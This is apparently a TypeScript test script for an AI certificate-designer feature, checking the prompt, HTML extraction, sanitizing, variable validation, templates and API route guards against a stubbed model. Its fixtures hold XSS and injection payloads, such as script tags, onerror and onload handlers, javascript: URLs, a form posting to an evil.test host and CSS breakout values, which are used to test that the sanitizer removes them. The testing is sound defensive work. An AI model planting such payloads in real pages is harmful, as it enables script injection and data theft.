/**
 * The AI certificate designer, offline.
 *
 * No provider key, no network, no database: the model is a stub that returns
 * whatever a check hands it. What is under test is everything around the model,
 * because that is where a certificate goes wrong:
 *
 *  - is the model told about every variable, and only real ones?
 *  - is the certificate found inside a reply that wraps it in prose or fences?
 *  - is what the sanitizer removes also removed from the source, and reported —
 *    without the `{{ }}` tags being damaged on the way?
 *  - is a certificate with no learner name refused, and an invented variable
 *    pointed out?
 *  - do the built-in designs survive the sanitizer untouched?
 *  - can a learner's name, or any other value, ever become markup?
 *
 *   npx tsx scripts/verify-certificate-ai.ts
 *   npx tsx scripts/verify-certificate-ai.ts --ai   # plus ONE real generation
 */
import "dotenv/config";
import { readFileSync, writeFileSync } from "node:fs";
import { Agent } from "@mastra/core/agent";
import { aiStatus, DEFAULT_AI_MODEL } from "../lib/ai/config";
import { AiError } from "../lib/ai/run";
import {
  certificateDesignRequestSchema,
  checkCertificateSource,
  cleanCertificateSource,
  designCertificate,
  extractCertificateHtml,
  MAX_REVISE_SOURCE_CHARS,
  processCertificateReply,
  sanitizerRemovals,
  type CertificateDesignRequest,
} from "../lib/certificates/ai";
import { certificateDesignerInstructions, certificateVariableGuide } from "../lib/certificates/ai-guide";
import { renderCertificateHtml, renderCertificatePreview } from "../lib/certificates/render-html";
import { parseDesign } from "../lib/certificates/design";
import { CERTIFICATE_TEMPLATES } from "../lib/certificates/templates";
import {
  CERTIFICATE_VARIABLES,
  LEARNER_NAME_VARIABLE,
  certificateSampleContext,
  type CertificateVariableDef,
} from "../lib/certificates/variables";
import { usedVariables } from "../lib/site/template";
import { certificateDesignerAgent } from "../src/mastra/agents/certificate-designer-agent";

const runLive = process.argv.includes("--ai");
// Kept aside before the offline checks clear the environment.
const realKeys = { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY, AI_MODEL: process.env.AI_MODEL };

let failed = 0;
let total = 0;

// A script that stops early prints nothing and exits 0 — which reads as a pass.
let finished = false;
process.on("exit", (code) => {
  if (!finished && code === 0) {
    console.log("\nverify-certificate-ai ended before its last check — treat this as a FAILURE.");
    process.exitCode = 1;
  }
});

function check(label: string, actual: unknown, expected: unknown) {
  total++;
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  const ok = a === e;
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}${ok ? "" : `\n      got  ${a}\n      want ${e}`}`);
}

/** Which of `needles` are missing from `haystack` — empty means all present. */
function missing(haystack: string | string[], needles: string[]): string[] {
  const text = Array.isArray(haystack) ? haystack.join("\n") : haystack;
  return needles.filter((needle) => !text.includes(needle));
}

/** Which of `needles` are present in `haystack` — empty means none got through. */
function present(haystack: string, needles: string[]): string[] {
  return needles.filter((needle) => haystack.toLowerCase().includes(needle.toLowerCase()));
}

/* -------------------------------------------------------------------------- */
/* Fixtures                                                                    */
/* -------------------------------------------------------------------------- */

const GOOD = `<style>
  @page { size: A4 landscape; margin: 12mm; }
  .cert {
    --cert-accent: {{ accentColor }};
    container-type: inline-size;
    position: relative;
    width: 100%;
    aspect-ratio: 1.414 / 1;
    overflow: hidden;
    background: #fff;
    font-family: Georgia, serif;
  }
  .cert * { box-sizing: border-box; margin: 0; padding: 0; }
  .cert-sheet { position: absolute; inset: 0; padding: 6cqw; text-align: center; border: 0.4cqw solid var(--cert-accent); }
  .cert-name { font-size: 6cqw; line-height: 1.1; }
  .cert-body { font-size: 1.7cqw; line-height: 1.6; }
</style>

<div class="cert">
  <div class="cert-sheet">
    {{#if tenant.logoUrl}}
      <img class="cert-logo" src="{{ tenant.logoUrl }}" alt="{{ tenant.name }}">
    {{/if}}
    <h1 class="cert-title">Certificate of Completion</h1>
    <p class="cert-name">{{ clientName }}</p>
    <p class="cert-body">for completing <strong>{{#if courseTitle}}{{ courseTitle }}{{else}}{{ programmeTitle }}{{/if}}</strong> on {{ date }}.</p>
    <p class="cert-serial">Certificate no. {{ serial }}</p>
  </div>
</div>`;

/** The same certificate with everything a certificate must not contain. */
const HOSTILE = GOOD.replace(
  "<style>",
  `<style>
  @import url(https://fonts.example.test/display.css);
  .cert-evil { behavior: url(evil.htc); background: url(javascript:alert(1)); color: red; }`
)
  .replace(
    '<h1 class="cert-title">',
    `<script>alert("x")</script>
    <form action="https://evil.test/collect"><input name="email"></form>
    <object data="movie.swf"></object>
    <a href="javascript:alert(1)">verify</a>
    <h1 class="cert-title" onclick="steal()">`
  )
  .replace("{{ date }}.", "{{ date }}, taught by {{ instructorName }}.");

const NO_NAME = GOOD.replace('<p class="cert-name">{{ clientName }}</p>', '<p class="cert-name">The learner</p>');

/* -------------------------------------------------------------------------- */
/* A model that says what it is told to                                        */
/* -------------------------------------------------------------------------- */

type StubReply = { text?: string; finishReason?: string; error?: unknown };
const calls: { prompt: string; options: Record<string, unknown> }[] = [];
let replies: (StubReply | (() => StubReply))[] = [];

const stub = new Agent({ id: "certificate-designer-stub", name: "stub", instructions: "stub", model: DEFAULT_AI_MODEL });
(stub as unknown as { generate: unknown }).generate = async (
  messages: { content: string }[],
  options: Record<string, unknown>
) => {
  calls.push({ prompt: messages[0].content, options });
  const next = replies.shift();
  if (!next) throw new Error("the stub was asked for more replies than the check supplied");
  return typeof next === "function" ? next() : next;
};

const CONTEXT = { tenantName: "Greenfield Academy", hasLogo: true, certificateName: "Welding L2", awardedFor: "course" as const };
const CREATE: Extract<CertificateDesignRequest, { mode: "create" }> = {
  mode: "create",
  occasion: "Finishing our 12-week welding course",
  style: "Formal and traditional",
  colours: null,
  orientation: "landscape",
};

async function design(request: CertificateDesignRequest, ...scripted: (StubReply | (() => StubReply))[]) {
  calls.length = 0;
  replies = scripted;
  try {
    return { result: await designCertificate(stub, request, CONTEXT), error: null as string | null };
  } catch (e) {
    return { result: null, error: e instanceof AiError ? e.code : `not an AiError: ${String(e)}` };
  }
}

async function main() {
  delete process.env.AI_MODEL;
  delete process.env.ANTHROPIC_API_KEY;
  delete process.env.OPENROUTER_API_KEY;

  /* ------------------------------------------------------------------------ */
  /* What the model is told                                                    */
  /* ------------------------------------------------------------------------ */

  const instructions = certificateDesignerInstructions();
  check(
    "the instructions name every certificate variable",
    missing(instructions, CERTIFICATE_VARIABLES.map((v) => `{{ ${v.path} }}`)),
    []
  );
  check(
    "…with what each one is",
    missing(instructions, CERTIFICATE_VARIABLES.map((v) => v.label)),
    []
  );

  // Generated, not typed out: a variable added to the catalog reaches the prompt.
  const extended: CertificateVariableDef[] = [
    ...CERTIFICATE_VARIABLES,
    { path: "tenant.motto", kind: "scalar", label: "The organisation's motto", sample: "Learn. Build. Lead." },
  ];
  check(
    "a variable added to the catalog appears in the instructions without touching them",
    [certificateDesignerInstructions(extended).includes("{{ tenant.motto }}"), instructions.includes("tenant.motto")],
    [true, false]
  );
  check(
    "the learner's name is marked as required",
    certificateVariableGuide()
      .split("\n")
      .filter((line) => line.includes("REQUIRED"))
      .map((line) => line.slice(0, line.indexOf(" —"))),
    [`- {{ ${LEARNER_NAME_VARIABLE} }}`]
  );
  check(
    "the instructions state the hard limits: one sheet, no scripts, no outside files, readable",
    missing(instructions, [
      "exactly one <style>",
      "<script>",
      "No external files",
      "@page { size: A4 landscape; margin: 12mm; }",
      "aspect-ratio: 1.414 / 1",
      "Nothing may overflow the sheet",
      "Contrast",
      "Never invent facts",
    ]),
    []
  );
  check(
    "the registered agent uses exactly these instructions",
    (await certificateDesignerAgent.getInstructions()) === instructions,
    true
  );
  check(
    "…and is registered with Mastra",
    /agents:\s*\{[^}]*\bcertificateDesignerAgent\b[^}]*\}/.test(readFileSync("src/mastra/index.ts", "utf8")),
    true
  );

  /* ------------------------------------------------------------------------ */
  /* Finding the certificate in a reply                                        */
  /* ------------------------------------------------------------------------ */

  check("a bare certificate is returned as it is", extractCertificateHtml(GOOD), GOOD);
  check(
    "a certificate inside a markdown fence, with sentences around it, is unwrapped",
    extractCertificateHtml(`Here is your certificate:\n\n\`\`\`html\n${GOOD}\n\`\`\`\n\nLet me know if you'd like changes!`),
    GOOD
  );
  check(
    "sentences before and after an unfenced certificate are dropped",
    extractCertificateHtml(`Sure — I used a <style> block as asked.\n\n${GOOD}\n\nHope this helps.`),
    GOOD
  );
  check(
    "an opening fence that was never closed is still unwrapped",
    extractCertificateHtml(`\`\`\`html\n${GOOD}`),
    GOOD
  );
  const asDocument = extractCertificateHtml(
    `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Certificate</title><style>.cert{color:red}</style></head><body><div class="cert">{{ clientName }}</div></body></html>`
  );
  check(
    "a whole HTML document is reduced to its styles and its body",
    [asDocument.includes("<style>.cert{color:red}</style>"), asDocument.includes('<div class="cert">{{ clientName }}</div>'), present(asDocument, ["<html", "<head", "<body", "<meta", "<title", "doctype"])],
    [true, true, []]
  );
  check("a reply with no markup contains no certificate", extractCertificateHtml("I'm sorry, I can't help with that."), "");

  /* ------------------------------------------------------------------------ */
  /* Cleaning the source                                                       */
  /* ------------------------------------------------------------------------ */

  const good = cleanCertificateSource(GOOD);
  check("a clean certificate is accepted by the cleaner", good.cleaned, true);
  check(
    "every {{ }} tag survives cleaning exactly, including in attributes and in CSS",
    [usedVariables(good.html).sort(), (good.html.match(/\{\{[^{}]*\}\}/g) ?? []).length],
    [usedVariables(GOOD).sort(), (GOOD.match(/\{\{[^{}]*\}\}/g) ?? []).length]
  );
  check(
    "…in the places they were",
    missing(good.html, [
      "--cert-accent: {{ accentColor }};",
      'src="{{ tenant.logoUrl }}"',
      'alt="{{ tenant.name }}"',
      "{{#if courseTitle}}{{ courseTitle }}{{else}}{{ programmeTitle }}{{/if}}",
    ]),
    []
  );
  check(
    "the stylesheet comes back laid out for editing, one declaration per line",
    good.html.includes("\n  .cert-name {\n    font-size: 6cqw;\n    line-height: 1.1;\n  }\n"),
    true
  );
  check("cleaning twice changes nothing more", cleanCertificateSource(good.html).html, good.html);

  const sample = certificateSampleContext({ tenantName: "Greenfield Academy", logoUrl: "https://cdn.example.test/logo.png", accentColor: "#0f766e" });
  const rendered = (source: string) => {
    const out = renderCertificatePreview(source, sample, "t");
    return `${out.css}|${out.html}`.replace(/\s+/g, " ");
  };
  check("a cleaned certificate looks exactly as the original did", rendered(good.html), rendered(GOOD));

  const hostile = cleanCertificateSource(HOSTILE);
  check(
    "scripts, handlers, forms, embeds, @import, behavior and javascript: URLs are gone from the cleaned source",
    [
      hostile.cleaned,
      present(hostile.html, ["<script", "alert(", "onclick", "<form", "<input", "<object", "@import", "behavior", "javascript:", "evil.htc", "evil.test"]),
    ],
    [true, []]
  );
  check(
    "…while the certificate itself, and its harmless CSS, are kept",
    missing(hostile.html, ["{{ clientName }}", "{{ serial }}", ".cert-evil {\n    color: red;"]),
    []
  );

  const removed = sanitizerRemovals(HOSTILE);
  check(
    "what the sanitizer takes out is reported in plain words",
    missing(removed, [
      "<script> element",
      "<form> element",
      "<input> element",
      "<object> element",
      "the onclick attribute on <h1>",
      "the href attribute on <a>",
      "the CSS @import rule",
      "CSS declarations: behavior, background",
    ]),
    []
  );
  check("a clean certificate has nothing removed", sanitizerRemovals(GOOD), []);

  // A tag where the sanitizer cannot keep it: the cleaner must notice and step
  // back, rather than hand over a certificate with half an {{#if}} missing.
  const tagInsideElement = GOOD.replace('<p class="cert-serial">', '<p {{#if serial}}class="cert-serial"{{/if}}>');
  const cautious = cleanCertificateSource(tagInsideElement);
  check(
    "a {{ }} tag inside an element's angle brackets makes the cleaner leave the source alone",
    [cautious.cleaned, cautious.html === tagInsideElement.trim()],
    [false, true]
  );

  /* ------------------------------------------------------------------------ */
  /* Checking it                                                               */
  /* ------------------------------------------------------------------------ */

  const clean = checkCertificateSource(good.html, { checkScaling: true, original: GOOD });
  check("a sound certificate has no issues and can be applied", [clean.issues, clean.blocked], [[], false]);

  const bad = processCertificateReply(HOSTILE, { checkScaling: true });
  check("an invented variable is named", bad.report.unknownVariables, ["instructorName"]);
  check(
    "…and explained, as a warning rather than a refusal",
    bad.report.issues.filter((i) => i.code === "unknown_variable").map((i) => [i.severity, i.message.includes("{{ instructorName }}")]),
    [["warning", true]]
  );
  check(
    "what was removed is listed for the person to read",
    bad.report.issues.filter((i) => i.code === "sanitized").map((i) => missing(i.message, ["<script>", "onclick", "@import"])),
    [[]]
  );
  check("removals alone do not block a certificate", bad.report.blocked, false);

  const nameless = checkCertificateSource(NO_NAME);
  check(
    "a certificate that does not show the learner's name is refused",
    [nameless.missingLearnerName, nameless.blocked, nameless.issues.find((i) => i.severity === "error")?.code],
    [true, true, "missing_learner_name"]
  );
  check(
    "the name inside an attribute or a condition does not count as shown",
    [
      checkCertificateSource(NO_NAME.replace('<div class="cert">', '<div class="cert" title="{{ clientName }}">')).missingLearnerName,
      checkCertificateSource(NO_NAME.replace("The learner", "{{#if clientName}}The learner{{/if}}")).missingLearnerName,
    ],
    [true, true]
  );
  check(
    "a loop is pointed out: a certificate has nothing to loop over",
    checkCertificateSource(GOOD.replace("{{ date }}.", "{{ date }}.{{#each courses}}{{ this.title }}{{/each}}")).issues.map((i) => i.code),
    ["unknown_variable", "loop"]
  );
  check(
    "missing certificate number, title and paper size are each pointed out",
    checkCertificateSource(`<style>.cert { color: #111; }</style><div class="cert"><p>{{ clientName }}</p></div>`).issues.map((i) => i.code),
    ["no_serial", "no_title", "no_page_rule"]
  );
  check(
    "an image from another website is pointed out",
    checkCertificateSource(GOOD.replace("<h1", '<img src="https://cdn.other.test/seal.png" alt=""><h1')).issues.map((i) => i.code),
    ["remote_image"]
  );
  check(
    "nothing but prose is refused outright",
    [checkCertificateSource("").blocked, checkCertificateSource("no markup here").issues.map((i) => i.code)],
    [true, ["empty"]]
  );

  /* ------------------------------------------------------------------------ */
  /* Data can never become markup                                              */
  /* ------------------------------------------------------------------------ */

  const attack = renderCertificatePreview(
    GOOD,
    {
      ...sample,
      clientName: `<script>alert(1)</script><img src=x onerror=alert(2)>`,
      courseTitle: `"><svg onload=alert(3)>`,
      accentColor: "red; } html { display: none } .x { color: red",
      tenant: { name: `" onmouseover="alert(4)`, logoUrl: "javascript:alert(5)", primaryColor: "#000" },
    },
    "t"
  );
  // Real tags only: text is escaped, so "<" in the output always starts an
  // element the certificate itself wrote. Attribute VALUES are blanked before
  // looking for handlers, because an escaped value may legitimately contain
  // the letters "onmouseover=" — as text inside alt="…", where it does nothing.
  const tags = attack.html.match(/<[a-zA-Z][^>]*>/g) ?? [];
  const tagNames = [...new Set(tags.map((tag) => /^<([a-zA-Z0-9]+)/.exec(tag)?.[1] ?? "?"))].sort();
  // Exactly the elements the certificate wrote — none added by a value.
  check("a learner's name, a title and an organisation name never become elements", tagNames, [
    "div",
    "h1",
    "img",
    "p",
    "strong",
  ]);
  check(
    "…or attributes, and a logo address that is really a script is dropped",
    [
      tags.filter((tag) => /\son[a-z]+\s*=/i.test(tag.replace(/"[^"]*"/g, '""'))),
      tags.filter((tag) => tag.startsWith("<img") && /\ssrc\s*=/i.test(tag)),
      present(attack.html, ["javascript:"]),
    ],
    [[], [], []]
  );
  check("…and the text itself is still there to read", attack.html.includes("&lt;script&gt;alert(1)&lt;/script&gt;"), true);
  // A value placed in CSS is not CSS-escaped, so one containing "}" can end the
  // rule it sits in and start another. What matters is where that rule can
  // reach: nowhere but the certificate it came from.
  check(
    "a value substituted into CSS can affect only the certificate it belongs to",
    [
      attack.css.split("\n").filter((line) => line.trim() && !line.startsWith('[data-css-scope="t"]')),
      attack.css.includes("<"),
    ],
    [[], false]
  );

  /* ------------------------------------------------------------------------ */
  /* The built-in designs                                                      */
  /* ------------------------------------------------------------------------ */

  const known = new Set(CERTIFICATE_VARIABLES.map((v) => v.path));
  check("there are five designs: the original and four more", CERTIFICATE_TEMPLATES.map((t) => t.id), [
    "classic",
    "heritage",
    "studio",
    "banner",
    "scholar",
  ]);
  check(
    "each has a name, a description and an id safe to use in a CSS scope",
    CERTIFICATE_TEMPLATES.filter((t) => !t.name || t.description.length < 20 || !/^[a-z0-9-]+$/.test(t.id)).map((t) => t.id),
    []
  );
  check(
    "no two designs are the same markup",
    new Set(CERTIFICATE_TEMPLATES.map((t) => t.html())).size,
    CERTIFICATE_TEMPLATES.length
  );

  for (const template of CERTIFICATE_TEMPLATES) {
    const html = template.html();
    const label = `${template.name}:`;
    check(`${label} the sanitizer removes nothing from it`, sanitizerRemovals(html), []);
    check(`${label} it uses only real variables`, usedVariables(html).filter((path) => !known.has(path)), []);

    const report = checkCertificateSource(html, { checkScaling: template.id !== "classic" });
    check(`${label} it passes every check the AI's work is held to`, report.issues.map((i) => i.code), []);

    const cleaned = cleanCertificateSource(html);
    check(`${label} cleaning it would change nothing a learner sees`, cleaned.cleaned, true);

    // Both kinds of certificate, with and without a logo.
    const forCourse = renderCertificatePreview(html, sample, "t").html;
    const forProgramme = renderCertificatePreview(
      html,
      { ...certificateSampleContext({ tenantName: "Greenfield Academy", logoUrl: "" }), courseTitle: "", programmeTitle: "Data Foundations" },
      "t"
    ).html;
    check(
      `${label} it fills in a course certificate with a logo, and a programme certificate without one`,
      [
        missing(forCourse, ["Ada Lovelace", "Intro to Analytics", "CERT-XXXXXXXXXX", "https://cdn.example.test/logo.png"]),
        missing(forProgramme, ["Ada Lovelace", "Data Foundations", "CERT-XXXXXXXXXX"]),
        present(forProgramme, ["<img"]),
        present(forCourse + forProgramme, ["{{", "}}"]),
      ],
      [[], [], [], []]
    );
  }

  const heritage = CERTIFICATE_TEMPLATES[1].html();
  const learnerView = renderCertificateHtml(parseDesign({ mode: "html", htmlSource: heritage }), sample, "cert1");
  const adminView = renderCertificatePreview(heritage, sample, "cert1");
  check(
    "a learner's certificate keeps its paper size; a preview inside the admin app leaves it out",
    [/@page\b/.test(learnerView.css), /@page\b/.test(adminView.css), adminView.html === learnerView.html],
    [true, false, true]
  );
  check(
    "sizing by the sheet, print colours and the darkened accent all survive the sanitizer",
    missing(learnerView.css, ["container-type: inline-size", "print-color-adjust: exact", "color-mix(in srgb, var(--cert-accent) 50%, #1c1917)", "6.2cqw"]),
    []
  );
  check(
    "every rule of a design is confined to its own certificate",
    learnerView.css
      .split("\n")
      .filter((line) => line.trim() && !line.startsWith("@page") && !line.startsWith('[data-css-scope="cert1"]')),
    []
  );

  /* ------------------------------------------------------------------------ */
  /* The request                                                               */
  /* ------------------------------------------------------------------------ */

  const parse = (value: unknown) => certificateDesignRequestSchema.safeParse(value);
  check(
    "a new design needs to say what it is for; paper defaults to landscape",
    [
      parse({ mode: "create", occasion: "" }).success,
      parse({ mode: "create", occasion: "  Graduation  " }).data,
    ],
    [false, { mode: "create", occasion: "Graduation", orientation: "landscape" }]
  );
  check(
    "a change needs an instruction and a certificate, and the certificate has a size limit",
    [
      parse({ mode: "revise", instruction: "Bigger name", currentHtml: GOOD }).success,
      parse({ mode: "revise", instruction: "", currentHtml: GOOD }).success,
      parse({ mode: "revise", instruction: "Bigger name", currentHtml: "" }).success,
      parse({ mode: "revise", instruction: "Bigger name", currentHtml: "x".repeat(MAX_REVISE_SOURCE_CHARS + 1) }).success,
    ],
    [true, false, false, false]
  );

  /* ------------------------------------------------------------------------ */
  /* Asking the model                                                          */
  /* ------------------------------------------------------------------------ */

  const unconfigured = await design(CREATE, { text: GOOD });
  check("no key: the request fails as not configured, and nothing is sent", [unconfigured.error, calls.length], ["not_configured", 0]);
  check("…and the status says so without a call", aiStatus().configured, false);

  // From here on a key "exists". The stub never uses it.
  process.env.ANTHROPIC_API_KEY = "stub-key-not-real";

  const created = await design(CREATE, { text: `Here you go:\n\n\`\`\`html\n${GOOD}\n\`\`\`` });
  check(
    "a good reply is returned cleaned, checked and usable after one call",
    [created.error, created.result?.attempts, created.result?.report.blocked, created.result?.report.issues, created.result?.html === good.html],
    [null, 1, false, [], true]
  );
  check(
    "the request carries the brief, the paper, and the context — as context",
    missing(calls[0]?.prompt ?? "", [
      "Design a new certificate.",
      "Orientation: landscape.",
      "Finishing our 12-week welding course",
      "Formal and traditional",
      "Greenfield Academy",
      "never type it into the certificate",
      "{{#if tenant.logoUrl}}",
    ]),
    []
  );
  const sent = (calls[0]?.options.modelSettings ?? {}) as Record<string, unknown>;
  check(
    "the call has an output limit and a deadline, and sets no sampling parameters",
    [typeof sent.maxOutputTokens, calls[0]?.options.abortSignal instanceof AbortSignal, present(JSON.stringify(calls[0]?.options), ["temperature", "topP", "topK"])],
    ["number", true, []]
  );

  await design({ ...CREATE, orientation: "portrait" }, { text: GOOD });
  check("portrait is asked for when chosen", (calls[0]?.prompt ?? "").includes("Orientation: portrait."), true);

  const revised = await design({ mode: "revise", instruction: "Make the name larger", currentHtml: GOOD }, { text: GOOD });
  check(
    "a change sends the instruction and the whole current certificate",
    [revised.error, missing(calls[0]?.prompt ?? "", ["Revise the certificate below.", "Make the name larger", '<p class="cert-name">{{ clientName }}</p>', "Change only what the request asks for"])],
    [null, []]
  );

  // The reply forgets the name and invents a variable: ask once more, precisely.
  const flawed = NO_NAME.replace("{{ date }}.", "{{ date }}, signed {{ instructorName }}.");
  const repaired = await design(CREATE, { text: flawed }, { text: GOOD });
  check(
    "a reply without the learner's name is sent back once, and the corrected one is used",
    [repaired.result?.attempts, calls.length, repaired.result?.report.blocked, repaired.result?.html === good.html],
    [2, 2, false, true]
  );
  check(
    "…with exactly what was wrong spelled out",
    missing(calls[1]?.prompt ?? "", ["{{ clientName }}", "{{ instructorName }} is not an available variable", "change nothing else", "The learner"]),
    []
  );

  const repairFails = await design(CREATE, { text: flawed }, () => {
    throw Object.assign(new Error("Overloaded"), { statusCode: 529 });
  });
  check(
    "if the correction fails, the first answer is kept and shown with its problems",
    [repairFails.error, repairFails.result?.attempts, repairFails.result?.report.blocked, repairFails.result?.report.unknownVariables],
    [null, 2, true, ["instructorName"]]
  );

  const repairWorse = await design(CREATE, { text: GOOD.replace("{{ date }}.", "{{ date }} {{ instructorName }}.") }, { text: NO_NAME });
  check(
    "a correction that is worse than the original is not used",
    [repairWorse.result?.report.blocked, repairWorse.result?.report.unknownVariables],
    [false, ["instructorName"]]
  );

  const noRepairNeeded = await design(CREATE, { text: HOSTILE.replace(", taught by {{ instructorName }}", "") });
  check(
    "things the sanitizer already removed are not worth a second call",
    [noRepairNeeded.result?.attempts, noRepairNeeded.result?.report.issues.map((i) => i.code)],
    [1, ["sanitized"]]
  );

  const refused = await design(CREATE, { text: "I can't design that." });
  check("a reply with no certificate in it is a failed request, not an empty design", [refused.error, calls.length], ["invalid_output", 1]);

  const cutOff = await design(CREATE, { text: GOOD.slice(0, 400), finishReason: "length" });
  check("a reply cut off at the output limit is reported as cut off", cutOff.error, "truncated");

  const noCredit = await design(CREATE, () => {
    throw Object.assign(new Error("Your credit balance is too low"), { statusCode: 400 });
  });
  check("a provider failure is reported by its real cause", noCredit.error, "credits");

  /* ------------------------------------------------------------------------ */
  /* The route                                                                 */
  /* ------------------------------------------------------------------------ */

  const route = readFileSync("app/api/tenant/certificates/[id]/generate/route.ts", "utf8");
  check(
    "the route checks CSRF, the certificate-editing permission, AI setup and the spend cap before the model",
    missing(route, ["requireCsrf(request)", "TENANT_CERTIFICATES_WRITE", "requireAiConfigured()", "enforceBudget(actor.tenantId)", "aiDomainError("]),
    []
  );
  check(
    "…in that order",
    ["requireCsrf(request)", "requireTenantActor(", "requireAiConfigured()", "await enforceBudget(", "designCertificate("]
      .map((needle) => route.lastIndexOf(needle))
      .every((position, index, all) => position > -1 && (index === 0 || position > all[index - 1])),
    true
  );
  check(
    "the route never writes a certificate: applying and saving stay with the person",
    present(route, ["certificate.update", "certificate.create", "certificate.upsert", "certificate.delete"]),
    []
  );

  /* ------------------------------------------------------------------------ */
  /* One real generation (optional)                                            */
  /* ------------------------------------------------------------------------ */

  if (runLive) {
    if (realKeys.AI_MODEL) process.env.AI_MODEL = realKeys.AI_MODEL;
    if (realKeys.ANTHROPIC_API_KEY) process.env.ANTHROPIC_API_KEY = realKeys.ANTHROPIC_API_KEY;
    else delete process.env.ANTHROPIC_API_KEY;

    const status = aiStatus();
    if (!status.configured) {
      console.log(`\n(skipped the live generation — set ${status.keyEnvVar} in .env to include it)`);
    } else {
      console.log(`\nAsking ${status.model} for one certificate…`);
      const started = Date.now();
      try {
        const live = await designCertificate(
          certificateDesignerAgent,
          {
            mode: "create",
            occasion: "Completing a twelve-week bookkeeping course for small-business owners",
            style: "Trustworthy and traditional, but not stuffy",
            colours: null,
            orientation: "landscape",
          },
          { tenantName: "Greenfield Academy", hasLogo: true, certificateName: "Bookkeeping essentials", awardedFor: "course" }
        );
        const took = ((Date.now() - started) / 1000).toFixed(1);
        console.log(`      ${took}s, ${live.attempts} call(s), ${live.html.length} characters`);
        // To look at what it made: CERTIFICATE_AI_DUMP=path/to/file.html
        if (process.env.CERTIFICATE_AI_DUMP) writeFileSync(process.env.CERTIFICATE_AI_DUMP, live.html);
        for (const issue of live.report.issues) console.log(`      ${issue.severity}: ${issue.message}`);
        check("live: the model returned a certificate that can be applied", live.report.blocked, false);
        check("live: …using only real variables", live.report.unknownVariables, []);
        check("live: …with nothing for the sanitizer to remove", live.report.removed, []);
        check(
          "live: …that follows the page contract (sheet-relative sizes, one sheet, prints in colour)",
          missing(live.html, ["@page", "container-type: inline-size", "aspect-ratio", "cqw", "print-color-adjust"]),
          []
        );
        check("live: …and shows the certificate number and what was completed", missing(live.html, ["{{ serial }}", "{{ clientName }}"]), []);
      } catch (e) {
        const error = e instanceof AiError ? `${e.code}: ${e.detail}` : String(e);
        check("live: the generation completed", error, "no error");
      }
    }
  } else {
    console.log("\n(skipped the live generation — pass --ai to make one real call)");
  }

  finished = true;
  console.log(failed === 0 ? `\nAll ${total} certificate AI checks passed.` : `\n${failed} of ${total} check(s) FAILED.`);
  process.exit(failed === 0 ? 0 : 1);
}

main().catch((e) => {
  console.error("verify-certificate-ai crashed:", e);
  process.exit(1);
});
